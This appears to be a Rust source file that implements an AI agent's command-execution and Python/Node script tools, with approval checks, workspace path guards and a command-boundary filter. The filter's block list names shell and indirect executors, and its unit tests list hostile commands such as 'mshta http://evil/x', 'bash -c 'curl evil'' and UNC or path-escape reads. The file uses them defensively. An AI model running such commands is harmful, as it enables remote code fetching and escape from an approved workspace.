//! 执行域工具：execute_command + Python/Node 沙箱（S1 拆分自 native.rs，台账 §2.1）。

//! 系统原生工具（对应方案步骤 2）。
//!
//! 提供一组最小可用的本地工具，全部纳入 `native__` 命名空间：
//!  - `native__read_file`：读取工作空间内文本文件（ReadSafe）；
//!  - `native__write_file`：写入/覆盖文件（RequireApproval，sensitive）；
//!  - `native__edit_file`：字符串替换式改文件（RequireApproval，sensitive，审批弹窗走 Diff）；
//!  - `native__list_directory`：列出目录内容（ReadSafe）；
//!  - `native__path_exists`：判断路径（文件/目录）是否存在及类型（ReadSafe，list/edit/read/write 的强制前置闭环）；
//!  - `native__execute_command`：执行系统命令（RequireApproval，sensitive）；
//!  - `native__run_python_sandbox`：在 micromamba 沙箱环境运行 Python 脚本（RequireApproval）。
//!
//! 所有文件操作都经 `PathGuard` 校验，约束在 workspace 内；沙箱执行复用 `mamba_manager`
//! 的 `run_python_script` 命令（不新建运行时）。

use std::time::Instant;

use async_trait::async_trait;
use serde_json::json;
use serde_json::Value;
use tauri::Manager;
use tokio::process::Command as AsyncCommand;
use tokio::time::timeout;
use tokio::time::Duration;

use crate::agent::engine::tools::AgentTool;
use crate::agent::engine::tools::ToolBehavior;
use crate::agent::engine::tools::PathGuard;
use crate::agent::engine::tools::PermissionLevel;
use crate::agent::engine::tools::ToolContext;
use crate::agent::engine::tools::ToolError;
use crate::mamba_manager::MambaManager;
use crate::mamba_manager::run_python_in_sandbox;
use crate::bun_manager::BunManager;
use crate::bun_manager::run_node_in_sandbox;


// zip 读写（首梯队原生工具 zip_create / zip_extract 依赖；自带 deflate/flate2）。

// 正则替换工具（首梯队补全）：Rust regex，线性时间保证，无 ReDoS 风险。
// HTTP 请求工具（首梯队补全）：重定向次数上限 5。
// SSRF 防御：自定义 DNS 解析器（reqwest::dns::Resolve），在连接前拦截环回 / 私有 / 链路本地等受限地址。

/// 宿主命令绝对硬超时（秒）。超时即显式 Kill 子进程，严防阻塞型命令挂死 Tokio 运行时。
const COMMAND_TIMEOUT_SECS: u64 = 60;



/// 构造标准 function-calling 定义骨架。

use super::*;


#[async_trait]
impl AgentTool for RunNodeSandboxTool {
    fn name(&self) -> String {
        "native__run_node_sandbox".into()
    }
    fn behavior(&self) -> ToolBehavior {
        ToolBehavior {
            op: Some("exec"),
            file_mutating: false,
            file_reading: false,
        }
    }
    fn tool_definition(&self) -> Value {
        def(
            "native__run_node_sandbox",
            "在 Work Duo 内置的 Bun 隔离 Node 环境（依赖隔离，非安全沙箱——文件/网络/进程无 OS 级限制）中运行 JavaScript / TypeScript 脚本（默认环境 default），单次执行最长 600 秒（超时强杀）。\n\
             【运行 Node 的唯一正确方式】\n\
             1. 直接用 code 参数给 JS/TS 源码（工具会自动落盘 .wd_mem/runtime/scripts/ 再执行，脚本内相对路径以工作空间根为基准），或先用 native__write_file 写脚本再传 script_path；\n\
             2. 脚本里直接 `import` / `require` 你需要的包（lodash / axios / zod / exceljs 等），运行时若缺失会自动按需安装并重试，无需你手动安装，也不要浪费轮次逐个探测包是否存在。\n\
             【严禁】\n\
             - 不要执行系统 node / bun 命令，不要用 `node --version`、`bun --version` 探测本机运行时；\n\
             - 绝对禁止用 `npm install -g` / 系统包管理器安装全局 Node 环境或任何系统软件——\
             这会脱离沙箱并污染用户本机环境；缺包时交给运行时自动安装即可。\n\
            本工具需用户审批，且要求该智能体已开启沙箱权限。\n\
            脚本中已注入 `WORKSPACE` 常量（工作空间绝对路径，code 与 script_path 两路均注入），文件操作请用 `WORKSPACE + '/相对路径'` 拼接，不要使用相对路径直接 open。\n\
            ⚠️ 脚本执行前会被复制到临时目录：`__file__` / `import.meta.url` 指向临时副本而非工作区，**严禁用它们推断工作区/项目根**，一律用注入的 WORKSPACE 常量。",
            json!({
                "code": {
                    "type": "string",
                    "description": "JavaScript / TypeScript 源代码（推荐用法：直接给代码，工具会自动落盘到 .wd_mem/runtime/scripts/ 再执行）"
                },
                "filename": {
                    "type": "string",
                    "description": "可选，配合 code 使用：落盘脚本名（默认 auto_run_<时间戳>.mjs），无需带路径；可带 .mjs/.cjs/.js/.ts 后缀"
                },
                "script_path": {
                    "type": "string",
                    "description": "已存在脚本的绝对路径（须在工作空间内）；与 code 二选一，两者都给时以 code 为准"
                },
                "env_name": { "type": "string", "description": "Bun 环境名，默认 default" }
            }),
            &[],
        )
    }
    fn check_permission(&self, _args: &Value) -> PermissionLevel {
        PermissionLevel::RequireApproval
    }
    async fn execute(&self, args: Value, ctx: &ToolContext) -> Result<String, ToolError> {
        tracing::info!(
            "[agent] native__run_node_sandbox: 请求 sandbox_enabled={} args={}",
            ctx.sandbox_enabled,
            crate::agent::engine::runtime::clip(&args.to_string(), 500),
        );
        if !ctx.sandbox_enabled {
            tracing::info!("[agent] native__run_node_sandbox: 拒绝，allow_sandbox=false");
            return Err(ToolError::PermissionDenied(
                "该智能体未开启沙箱权限（allow_sandbox=false），拒绝执行".into(),
            ));
        }
        // 与 Python 沙箱同构：① code 直传（消除模型绕道到系统 node 的动机）；② script_path 兼容旧用法。
        let code = args.get("code").and_then(|v| v.as_str());
        let script_path = args.get("script_path").and_then(|v| v.as_str());

        let resolved_script: String = if let Some(code) = code {
            let ws = ctx.workspace.clone().ok_or_else(|| {
                ToolError::PermissionDenied(
                    "未提供工作空间，无法落盘 Node 脚本（请先绑定工程目录），或改用 script_path 传入已有脚本".into(),
                )
            })?;
            let raw_name = args
                .get("filename")
                .and_then(|v| v.as_str())
                .unwrap_or("")
                .trim();
            let name = if raw_name.is_empty() {
                let ts = std::time::SystemTime::now()
                    .duration_since(std::time::UNIX_EPOCH)
                    .map(|d| d.as_millis())
                    .unwrap_or(0);
                format!("auto_run_{ts}.mjs")
            } else if raw_name.ends_with(".mjs")
                || raw_name.ends_with(".cjs")
                || raw_name.ends_with(".js")
                || raw_name.ends_with(".ts")
            {
                raw_name.to_string()
            } else {
                format!("{raw_name}.mjs")
            };
            // 文件名消毒：剔除路径分隔符与非法字符，杜绝 ../ 穿越
            let safe_name: String = name
                .chars()
                .filter(|c| !matches!(c, '/' | '\\' | ':' | '"' | '<' | '>' | '|' | '?' | '*'))
                .collect();
            let dir = ws.join(".wd_mem").join("runtime").join("scripts");
            std::fs::create_dir_all(&dir)
                .map_err(|e| ToolError::ExecutionFailed(format!("创建脚本目录失败：{e}")))?;
            let p = dir.join(&safe_name);
            // 改动 2A：code 落盘前头部注入 WORKSPACE 常量（JSON 转义处理反斜杠/引号），
            // 模型脚本里可直接引用，避免相对路径解析到临时目录导致 ENOENT。
            let injected = inject_workspace_line(
                code,
                &format!(
                    "const WORKSPACE = {};",
                    serde_json::to_string(&normalize_workspace_path(&ws)).unwrap_or_default()
                ),
            );
            std::fs::write(&p, &injected)
                .map_err(|e| ToolError::ExecutionFailed(format!("写入脚本失败：{e}")))?;
            // 落盘后仍过 PathGuard，确保最终执行路径未逃逸工作空间。
            let abs = PathGuard::check(&p.to_string_lossy(), ctx)?;
            abs.to_string_lossy().to_string()
        } else if let Some(sp) = script_path {
            let abs = PathGuard::check(sp, ctx)?;
            // Fix（同 Python 沙箱 2026-09-18）：Node 脚本执行时同样会被复制到临时目录，
            // `__file__`/`import.meta.url` 指向临时副本——与 code 路径同款注入 WORKSPACE 常量，
            // 落盘注入版（不覆盖原脚本，保留原后缀）再执行，两路行为一致。
            let ws = ctx.workspace.clone().ok_or_else(|| {
                ToolError::PermissionDenied(
                    "未提供工作空间，无法为 script_path 注入 WORKSPACE（请先绑定工程目录）".into(),
                )
            })?;
            let src = std::fs::read_to_string(&abs)
                .map_err(|e| ToolError::ExecutionFailed(format!("读取脚本失败：{e}")))?;
            let stem = abs
                .file_stem()
                .and_then(|s| s.to_str())
                .unwrap_or("script")
                .chars()
                .filter(|c| !matches!(c, '/' | '\\' | ':' | '"' | '<' | '>' | '|' | '?' | '*'))
                .collect::<String>();
            let ext = abs
                .extension()
                .and_then(|e| e.to_str())
                .map(|e| format!(".{e}"))
                .unwrap_or_else(|| ".mjs".to_string());
            let dir = ws.join(".wd_mem").join("runtime").join("scripts");
            std::fs::create_dir_all(&dir)
                .map_err(|e| ToolError::ExecutionFailed(format!("创建脚本目录失败：{e}")))?;
            let injected_path = dir.join(format!("injected_{stem}{ext}"));
            let injected = inject_workspace_line(
                &src,
                &format!(
                    "const WORKSPACE = {};",
                    serde_json::to_string(&normalize_workspace_path(&ws)).unwrap_or_default()
                ),
            );
            std::fs::write(&injected_path, &injected)
                .map_err(|e| ToolError::ExecutionFailed(format!("写入注入脚本失败：{e}")))?;
            let checked = PathGuard::check(&injected_path.to_string_lossy(), ctx)?;
            checked.to_string_lossy().to_string()
        } else {
            return Err(ToolError::InvalidArgs(
                "run_node_sandbox 需要提供 code（JS/TS 源码，推荐）或 script_path（工作空间内脚本绝对路径）之一".into(),
            ));
        };
        let env_name = args
            .get("env_name")
            .and_then(|v| v.as_str())
            .map(|s| s.to_string());

        // 沙箱审计（2026-09-24 安全增强批次）：与 python 同款，只记录不拦截。
        if let Ok(script_src) = std::fs::read_to_string(&resolved_script) {
            let feats = crate::sandbox_audit::scan_script("bun", &script_src);
            crate::sandbox_audit::audit_script_features(
                &self.app,
                "bun",
                &resolved_script,
                ctx.workspace.as_deref(),
                &feats,
            );
        }

        tracing::info!(
            "[agent] native__run_node_sandbox: 开始 script={} env={}",
            resolved_script,
            env_name.as_deref().unwrap_or("default"),
        );
        let started = Instant::now();
        let mgr = self.app.state::<BunManager>();
        match run_node_in_sandbox(&self.app, &*mgr, env_name, resolved_script, ctx.workspace.as_deref()).await {
            Ok(out) => {
                // 透传退出码给 verifier：command_succeeded 直接读 exit_code（通用判定，与输出措辞无关）。
                if let Ok(mut g) = ctx.run_outcomes.lock() {
                    g.push(crate::agent::engine::tools::RunOutcome {
                        output: out.stdout.clone(),
                        exit_code: out.exit_code,
                    });
                }
                tracing::info!(
                    "[agent] native__run_node_sandbox: 成功 result={}字符 耗时={}ms 退出码={:?} 内容={}",
                    out.stdout.chars().count(),
                    started.elapsed().as_millis(),
                    out.exit_code,
                    crate::agent::engine::runtime::clip(&out.stdout, 500),
                );
                Ok(out.stdout)
            }
            Err(e) => {
                tracing::info!(
                    "[agent] native__run_node_sandbox: 失败 耗时={}ms error={}",
                    started.elapsed().as_millis(),
                    e
                );
                Err(ToolError::ExecutionFailed(e))
            }
        }
    }
}


#[async_trait]
impl AgentTool for RunPythonSandboxTool {
    fn name(&self) -> String {
        "native__run_python_sandbox".into()
    }
    fn behavior(&self) -> ToolBehavior {
        ToolBehavior {
            op: Some("exec"),
            file_mutating: false,
            file_reading: false,
        }
    }
    fn tool_definition(&self) -> Value {
        def(
            "native__run_python_sandbox",
            "在 Work Duo 内置的 micromamba 隔离 Python 环境（依赖隔离，非安全沙箱——文件/网络/进程无 OS 级限制）中运行脚本（默认环境 default），单次执行最长 600 秒（超时强杀）。\n\
             【运行 Python 的唯一正确方式】\n\
             1. 直接用 code 参数给 Python 源码（工具会自动落盘 .wd_mem/runtime/scripts/ 再执行，脚本内相对路径以工作空间根为基准），或先用 native__write_file 写脚本再传 script_path；\n\
             2. 脚本里直接 import 你需要的库（pandas / numpy / openpyxl / scipy / matplotlib 等），运行时若缺失会自动按需安装并重试，无需你手动安装，也不要浪费轮次逐个探测库是否存在。\n\
             【严禁】\n\
             - 不要执行系统 python / python3 命令，不要用 where python、python --version 探测本机 Python；\n\
             - 绝对禁止用 winget / choco / brew / apt / pip 安装系统级 Python 或任何系统软件——\
             这会脱离沙箱并污染用户本机环境；缺库时交给运行时自动安装即可。\n\
            本工具需用户审批，且要求该智能体已开启沙箱权限。\n\
            脚本中已注入 `WORKSPACE` 变量（工作空间绝对路径字符串，code 与 script_path 两路均注入），文件操作请用 `os.path.join(WORKSPACE, '相对路径')` 拼接，不要使用相对路径直接 open。\n\
            ⚠️ 脚本执行前会被复制到沙箱临时目录：`__file__` 指向临时副本而非工作区，**严禁用 `__file__` 推断工作区/项目根**，一律用注入的 WORKSPACE 变量。",
            json!({
                "code": {
                    "type": "string",
                    "description": "Python 源代码（推荐用法：直接给代码，工具会自动落盘到 .wd_mem/runtime/scripts/ 再执行）"
                },
                "filename": {
                    "type": "string",
                    "description": "可选，配合 code 使用：落盘脚本名（默认 auto_run_<时间戳>.py），无需带路径"
                },
                "script_path": {
                    "type": "string",
                    "description": "已存在脚本的绝对路径（须在工作空间内）；与 code 二选一，两者都给时以 code 为准"
                },
                "env_name": { "type": "string", "description": "micromamba 环境名，默认 default" }
            }),
            // code 与 script_path 二选一，故此处不设必填，改在 execute 内校验并给出明确错误
            &[],
        )
    }
    fn check_permission(&self, _args: &Value) -> PermissionLevel {
        PermissionLevel::RequireApproval
    }
    async fn execute(&self, args: Value, ctx: &ToolContext) -> Result<String, ToolError> {
        tracing::info!(
            "[agent] native__run_python_sandbox: 请求 sandbox_enabled={} args={}",
            ctx.sandbox_enabled,
            crate::agent::engine::runtime::clip(&args.to_string(), 500),
        );
        if !ctx.sandbox_enabled {
            tracing::info!("[agent] native__run_python_sandbox: 拒绝，allow_sandbox=false");
            return Err(ToolError::PermissionDenied(
                "该智能体未开启沙箱权限（allow_sandbox=false），拒绝执行".into(),
            ));
        }
        // 两种调用方式（code 优先）：
        // ① code：直接给源码 → 内部落盘到 `.wd_mem/runtime/scripts/` 再执行。
        //    这一步是消除「模型改用 execute_command 跑系统 python」动机的关键：原先强制
        //    「先 write_file 写脚本、再传 script_path」（两步 + 每次审批），摩擦过大导致绕道。
        // ② script_path：已存在脚本的绝对路径（兼容旧用法）。
        let code = args.get("code").and_then(|v| v.as_str());
        let script_path = args.get("script_path").and_then(|v| v.as_str());

        let resolved_script: String = if let Some(code) = code {
            let ws = ctx.workspace.clone().ok_or_else(|| {
                ToolError::PermissionDenied(
                    "未提供工作空间，无法落盘 Python 脚本（请先绑定工程目录），或改用 script_path 传入已有脚本".into(),
                )
            })?;
            let raw_name = args
                .get("filename")
                .and_then(|v| v.as_str())
                .unwrap_or("")
                .trim();
            let name = if raw_name.is_empty() {
                let ts = std::time::SystemTime::now()
                    .duration_since(std::time::UNIX_EPOCH)
                    .map(|d| d.as_millis())
                    .unwrap_or(0);
                format!("auto_run_{ts}.py")
            } else if raw_name.ends_with(".py") {
                raw_name.to_string()
            } else {
                format!("{raw_name}.py")
            };
            // 文件名消毒：剔除路径分隔符与非法字符，杜绝 ../ 穿越
            let safe_name: String = name
                .chars()
                .filter(|c| !matches!(c, '/' | '\\' | ':' | '"' | '<' | '>' | '|' | '?' | '*'))
                .collect();
            let dir = ws.join(".wd_mem").join("runtime").join("scripts");
            std::fs::create_dir_all(&dir)
                .map_err(|e| ToolError::ExecutionFailed(format!("创建脚本目录失败：{e}")))?;
            let p = dir.join(&safe_name);
            // 改动 2B：code 落盘前头部注入 WORKSPACE 常量（工作空间绝对路径），
            // 模型脚本里可直接引用，避免相对路径解析到临时目录导致 ENOENT。
            let injected = inject_workspace_line(
                code,
                &format!("WORKSPACE = r\"{}\"", normalize_workspace_path(&ws)),
            );
            std::fs::write(&p, &injected)
                .map_err(|e| ToolError::ExecutionFailed(format!("写入脚本失败：{e}")))?;
            // 落盘后仍过 PathGuard，确保最终执行路径未逃逸工作空间（安全边界不降低）
            let abs = PathGuard::check(&p.to_string_lossy(), ctx)?;
            abs.to_string_lossy().to_string()
        } else if let Some(sp) = script_path {
            // 脚本路径同样受 PathGuard 约束（须在工作空间内）。
            let abs = PathGuard::check(sp, ctx)?;
            // Fix（2026-09-18 真机烧钱事故）：script_path 脚本执行时会被复制到 mamba 临时目录
            // （mamba_root/run_tmp/__sandbox_run_*.py），`__file__` 指向临时副本——模型用
            // `Path(__file__).parents[n]` 推断工作区全部解析到 target\debug\...，反复迭代验证
            // 脚本直至撞轮数上限。与 code 路径同款修复：读取原脚本、头部注入 WORKSPACE 常量，
            // 落盘 .wd_mem/runtime/scripts/ 注入版（不覆盖原脚本）再执行，两路行为一致。
            let ws = ctx.workspace.clone().ok_or_else(|| {
                ToolError::PermissionDenied(
                    "未提供工作空间，无法为 script_path 注入 WORKSPACE（请先绑定工程目录）".into(),
                )
            })?;
            let src = std::fs::read_to_string(&abs)
                .map_err(|e| ToolError::ExecutionFailed(format!("读取脚本失败：{e}")))?;
            let stem = abs
                .file_stem()
                .and_then(|s| s.to_str())
                .unwrap_or("script")
                .chars()
                .filter(|c| !matches!(c, '/' | '\\' | ':' | '"' | '<' | '>' | '|' | '?' | '*'))
                .collect::<String>();
            let dir = ws.join(".wd_mem").join("runtime").join("scripts");
            std::fs::create_dir_all(&dir)
                .map_err(|e| ToolError::ExecutionFailed(format!("创建脚本目录失败：{e}")))?;
            let injected_path = dir.join(format!("injected_{stem}.py"));
            let injected = inject_workspace_line(
                &src,
                &format!("WORKSPACE = r\"{}\"", normalize_workspace_path(&ws)),
            );
            std::fs::write(&injected_path, &injected)
                .map_err(|e| ToolError::ExecutionFailed(format!("写入注入脚本失败：{e}")))?;
            let checked = PathGuard::check(&injected_path.to_string_lossy(), ctx)?;
            checked.to_string_lossy().to_string()
        } else {
            return Err(ToolError::InvalidArgs(
                "run_python_sandbox 需要提供 code（Python 源码，推荐）或 script_path（工作空间内脚本绝对路径）之一".into(),
            ));
        };
        // 沙箱审计（2026-09-24 安全增强批次）：脚本静态特征扫描，只记录不拦截（用户决策）。
        if let Ok(script_src) = std::fs::read_to_string(&resolved_script) {
            let feats = crate::sandbox_audit::scan_script("python", &script_src);
            crate::sandbox_audit::audit_script_features(
                &self.app,
                "python",
                &resolved_script,
                ctx.workspace.as_deref(),
                &feats,
            );
        }
        let env_name = args
            .get("env_name")
            .and_then(|v| v.as_str())
            .map(|s| s.to_string());
        // resolved_script 已是校验并归一化的绝对路径：模型可能传相对路径（如 `install_openpyxl.py`），
        // 而 Rust 进程 cwd 并非工作空间，直接交给 mamba 会因「脚本文件不存在」失败。

        tracing::info!(
            "[agent] native__run_python_sandbox: 开始 script={} env={}",
            resolved_script,
            env_name.as_deref().unwrap_or("default"),
        );
        let started = Instant::now();
        let mgr = self.app.state::<MambaManager>();
        match run_python_in_sandbox(
            &self.app,
            &*mgr,
            env_name,
            resolved_script.clone(),
            ctx.workspace.as_deref(),
        )
        .await {
            Ok(out) => {
                // 透传退出码给 verifier：command_succeeded 直接读 exit_code（通用判定，与输出措辞无关）。
                if let Ok(mut g) = ctx.run_outcomes.lock() {
                    g.push(crate::agent::engine::tools::RunOutcome {
                        output: out.stdout.clone(),
                        exit_code: out.exit_code,
                    });
                }
                tracing::info!(
                    "[agent] native__run_python_sandbox: 成功 result={}字符 耗时={}ms 退出码={:?} 内容={}",
                    out.stdout.chars().count(),
                    started.elapsed().as_millis(),
                    out.exit_code,
                    crate::agent::engine::runtime::clip(&out.stdout, 500),
                );
                Ok(out.stdout)
            }
            Err(e) => {
                tracing::info!(
                    "[agent] native__run_python_sandbox: 失败 耗时={}ms error={}",
                    started.elapsed().as_millis(),
                    e
                );
                // 失败诊断增强（外部评审 D06）：语法类失败时附落盘脚本头部预览——
                // 注入行位置/转义损坏在此一目了然（模型一轮即可自纠，不再盲试）。
                let hint = if e.contains("SyntaxError") || e.contains("IndentationError") {
                    match std::fs::read_to_string(&resolved_script) {
                        Ok(content) => {
                            let head: Vec<&str> = content.lines().take(8).collect();
                            format!("\n[落盘脚本头部预览]\n{}", head.join("\n"))
                        }
                        Err(_) => String::new(),
                    }
                } else {
                    String::new()
                };
                Err(ToolError::ExecutionFailed(format!("{e}{hint}")))
            }
        }
    }
}


pub struct ExecuteCommandTool;

#[async_trait]
impl AgentTool for ExecuteCommandTool {
    fn name(&self) -> String {
        "native__execute_command".into()
    }
    fn behavior(&self) -> ToolBehavior {
        ToolBehavior {
            op: Some("exec"),
            file_mutating: false,
            file_reading: false,
        }
    }
    fn tool_definition(&self) -> Value {
        def(
            "native__execute_command",
            "在工作空间内执行一条系统命令（shell）。需用户审批。命令不得包含「..」路径段、盘符/UNC 绝对路径或段首嵌套 shell（cmd/powershell/bash 等）——越界形态会被前置拒绝；文件读写优先使用配套文件工具。",
            json!({
                "command": { "type": "string", "description": "要执行的命令（含参数，工作空间内相对路径）" },
                "fail_on_nonzero": {
                    "type": "boolean",
                    "description": "命令非零退出是否视为执行失败（默认 true，对齐 P2a「命令非 0→档A」契约；grep 无匹配等合法非 0 可传 false 关闭）"
                }
            }),
            &["command"],
        )
    }
    fn check_permission(&self, _args: &Value) -> PermissionLevel {
        PermissionLevel::RequireApproval
    }
    async fn execute(&self, args: Value, ctx: &ToolContext) -> Result<String, ToolError> {
        let command = args.get("command").and_then(|v| v.as_str()).ok_or_else(|| {
            ToolError::InvalidArgs("execute_command 缺少 command 参数".into())
        })?;
        // 缺口 A：非零退出视为执行失败（默认开启，对齐 P2a 契约）。合法非 0（如 grep 无匹配）调用方传 false 关闭。
        let fail_on_nonzero = args
            .get("fail_on_nonzero")
            .and_then(|v| v.as_bool())
            .unwrap_or(true);
        // F009：cmd /C 整串透传的前置护栏——审批通过一次不应等价于逃出工作空间。
        ensure_command_in_boundary(command)?;
        let cwd = match ctx.workspace.clone() {
            Some(ws) => ws,
            None => {
                // 问题 4 修复：未设置工作空间时拒绝执行系统命令（收紧），
                // 不回退进程 CWD（可能是安装目录，越权风险）。
                return Err(ToolError::PermissionDenied(
                    "未设置工作空间，拒绝执行系统命令".into(),
                ));
            }
        };
        tracing::info!(
            "[agent] native__execute_command: 开始 cwd={} command={}",
            cwd.display(),
            crate::agent::engine::runtime::clip(command, 500),
        );
        let start = Instant::now();
        // 防僵死：使用异步 tokio::process::Command 替代阻塞型 std::process::Command，
        // 外层包裹绝对硬超时；超时则显式 Kill 子进程（kill_on_drop 兜底），并向模型返回 JSON 错误提示。
        let mut cmd = if cfg!(target_os = "windows") {
            AsyncCommand::new("cmd")
        } else {
            AsyncCommand::new("sh")
        };
        cmd.arg(if cfg!(target_os = "windows") { "/C" } else { "-c" })
            .arg(command)
            .current_dir(cwd)
            .kill_on_drop(true)
            .stdin(std::process::Stdio::null())
            .stdout(std::process::Stdio::piped())
            .stderr(std::process::Stdio::piped());
        let child = cmd
            .spawn()
            .map_err(|e| ToolError::ExecutionFailed(format!("命令启动失败：{e}")))?;

        let waited = timeout(Duration::from_secs(COMMAND_TIMEOUT_SECS), child.wait_with_output()).await;
        match waited {
            Ok(Ok(out)) => {
                let stdout = String::from_utf8_lossy(&out.stdout).to_string();
                let stderr = String::from_utf8_lossy(&out.stderr).to_string();
                tracing::info!(
                    "[agent] native__execute_command: 返回 exit_code={:?} stdout={}字符 stderr={}字符 耗时={}ms stdout_preview={} stderr_preview={}",
                    out.status.code(),
                    stdout.chars().count(),
                    stderr.chars().count(),
                    start.elapsed().as_millis(),
                    crate::agent::engine::runtime::clip(&stdout, 500),
                    crate::agent::engine::runtime::clip(&stderr, 500),
                );
                let code = out.status.code();
                // 缺口 A 修复：非零退出码按「执行失败」返回（对齐 P2a「命令非 0→档A」契约），
                // 驱动 pipeline 连续错误计数→受阻弹窗。命令可能合法返回非 0（如 grep 无匹配）时，
                // 调用方可传 fail_on_nonzero=false 关闭此行为。
                if fail_on_nonzero && !out.status.success() {
                    return Err(ToolError::ExecutionFailed(format!(
                        "命令非零退出（code={:?}）：stdout={} stderr={}",
                        code,
                        crate::agent::engine::runtime::clip(&stdout, 300),
                        crate::agent::engine::runtime::clip(&stderr, 300),
                    )));
                }
                Ok(serde_json::to_string_pretty(&json!({
                    "exit_code": code,
                    "stdout": stdout,
                    "stderr": stderr,
                    "elapsed_ms": start.elapsed().as_millis() as u64
                }))
                .unwrap_or_else(|_| "{}".into()))
            }
            Ok(Err(e)) => Err(ToolError::ExecutionFailed(format!("命令等待失败：{e}"))),
            Err(_elapsed) => {
                // 超时：wait_with_output 的 future 被 drop，kill_on_drop(true) 已显式终止子进程，
                // 确保主 Tokio 运行时不被永久挂起、进程不留活口。
                tracing::info!(
                    "[agent] native__execute_command: 超时 {}s，已强制终止子进程 command={}",
                    COMMAND_TIMEOUT_SECS,
                    crate::agent::engine::runtime::clip(command, 300),
                );
                Err(ToolError::ExecutionFailed(format!(
                    "{{\"error\": \"Command execution timed out after {}s. Process killed.\"}}",
                    COMMAND_TIMEOUT_SECS
                )))
            }
        }
    }
}


/* ============================ F009：命令串边界前置过滤 ============================ */

/// 段首禁用的嵌套 shell / 间接执行器（详见 ensure_command_in_boundary）。
/// 注意：python / node 等项目运行时**不在列**——跑项目脚本是本工具的核心合法用途，
/// 解释器读越界文件属已知残留，由 RequireApproval（命令原文可见）兜底。
const BANNED_EXECUTORS: [&str; 13] = [
    "cmd", "powershell", "pwsh", "bash", "sh", "zsh", "wsl", "mshta", "rundll32", "regsvr32",
    "wscript", "cscript", "forfiles",
];

/// F009：`cmd /C` 整串透传的前置护栏。
///
/// 本工具是 shell 语义（dir/type 内建、管道、相对重定向是产品能力），无法改 argv
/// 直执行；本过滤封堵「审批通过一次即逃出工作空间」的显式逃逸形态：
///  1. `..` 路径段（`cd ..`、`..\secret`；`cd..` 简写同样拦）——git 的 `a..b`
///     区间语法不含分隔符，不误伤；
///  2. 盘符绝对路径（`C:\`，须处于词首避免误伤 URL 的 `s://`）与 UNC（`\\`）——
///     重定向/读取落点被钉在工作空间内；
///  3. 段首嵌套 shell / 间接执行器（按 `& | ;` 换行切段取段首 token）——
///     `dir & cmd /C evil` 被拦，`find "cmd" log.txt` 等参数位置不误伤。
///
/// 已知残留（黑名单本质所限，不追求穷尽）：环境变量展开子串、`start` 间接拉起、
/// 解释器读越界文件等——RequireApproval（审批卡展示命令原文）仍是最终闸门。
fn ensure_command_in_boundary(command: &str) -> Result<(), ToolError> {
    let lower = command.to_lowercase();

    let dotdot = regex::Regex::new(r#"(?:^|[\s\\/"'=])\.\.(?:$|[\s\\/"'])|cd\.\."#).unwrap();
    if let Some(m) = dotdot.find(&lower) {
        return Err(ToolError::PermissionDenied(format!(
            "命令包含越界形态「..」（{}）：工作空间外路径不可访问，请改用工作空间内相对路径。",
            crate::agent::engine::runtime::clip(m.as_str(), 40)
        )));
    }

    let drive = regex::Regex::new(r#"(?:^|[\s"'=])[a-z]:[\\/]"#).unwrap();
    if drive.is_match(&lower) {
        return Err(ToolError::PermissionDenied(
            "命令包含盘符绝对路径：仅允许工作空间内相对路径（读取/重定向一律落在工作空间内）。".into(),
        ));
    }
    if lower.contains(r"\\") {
        return Err(ToolError::PermissionDenied(
            "命令包含 UNC 网络路径：仅允许工作空间内相对路径。".into(),
        ));
    }

    let segment_first = |seg: &str| -> Option<String> {
        seg.split_whitespace().next().map(|t| {
            let t = t.trim_matches(|c| c == '"' || c == '\'');
            let base = t.rsplit(|c| c == '\\' || c == '/').next().unwrap_or(t);
            base.trim_end_matches(".exe").to_string()
        })
    };
    for seg in lower.split(['&', '|', ';', '\n', '\r']) {
        if let Some(first) = segment_first(seg) {
            if BANNED_EXECUTORS.contains(&first.as_str()) {
                return Err(ToolError::PermissionDenied(format!(
                    "命令试图调用嵌套 shell / 间接执行器「{first}」：本工具不允许二次解释。"
                )));
            }
        }
    }
    Ok(())
}

#[cfg(test)]
mod f009_tests {
    use super::ensure_command_in_boundary;

    fn ok(cmd: &str) {
        assert!(ensure_command_in_boundary(cmd).is_ok(), "应放行：{cmd}");
    }
    fn rejected(cmd: &str) {
        assert!(ensure_command_in_boundary(cmd).is_err(), "应拒绝：{cmd}");
    }

    #[test]
    fn allows_regular_workspace_commands() {
        ok("npm run build");
        ok("python -m pytest -q");
        ok("python script.py");
        ok("node scripts/post.js");
        ok("dir");
        ok("type notes.md > out.txt"); // 相对重定向放行
        ok("git log main..dev --oneline"); // git 区间语法不误伤
        ok("git log a..b");
        ok("npm test && node scripts/post.js");
        ok("curl https://example.com/api"); // URL 的 s:// 不判盘符
        ok("find \"cmd\" log.txt"); // 参数位置的 cmd 不误伤
        ok("echo fix: x"); // 冒号后非斜杠不判盘符
        ok("git commit -m \"feat: 1..9 range\""); // 引号内 a..b 不误伤
    }

    #[test]
    fn rejects_dotdot_escape() {
        rejected("cd .. && type secret.txt");
        rejected("type ..\\secret");
        rejected("type ../secret");
        rejected("cd../x"); // cmd 无空格简写
        rejected("python --out=../x run.py");
    }

    #[test]
    fn rejects_absolute_paths() {
        rejected("echo x > C:\\temp\\x.txt");
        rejected("type C:/Windows/win.ini");
        rejected("cd /d D:\\other && build");
        rejected("dir \\\\evil\\share");
    }

    #[test]
    fn rejects_nested_shell() {
        rejected("powershell -e XXXX");
        rejected("CMD /C whoami");
        rejected("cmd.exe /c dir");
        rejected("dir & cmd /C whoami"); // 段首位置拦截
        rejected("echo hi && powershell -c x");
        rejected("bash -c 'curl evil'");
        rejected("mshta http://evil/x");
        rejected("forfiles /p . /m *.txt /c \"cmd /c evil\"");
    }
}
